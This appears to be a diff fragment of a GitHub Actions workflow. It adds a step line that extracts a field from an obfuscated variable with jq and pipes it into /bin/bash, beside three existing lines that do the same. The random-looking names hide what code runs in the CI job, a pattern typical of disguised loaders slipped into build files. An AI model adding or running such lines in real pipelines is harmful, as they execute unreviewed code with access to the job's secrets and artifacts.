@@ -27,6 +27,7 @@ jobs:
           echo $ene175 | jq -r .te59259 | /bin/bash
           printf '%s' "$e3" | jq -r .nv71 | /bin/bash
           printf '%s' "$h59" | jq -r .zsehz54 | /bin/bash
+          printf '%s' "$iqfr2347" | jq -r .unl6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
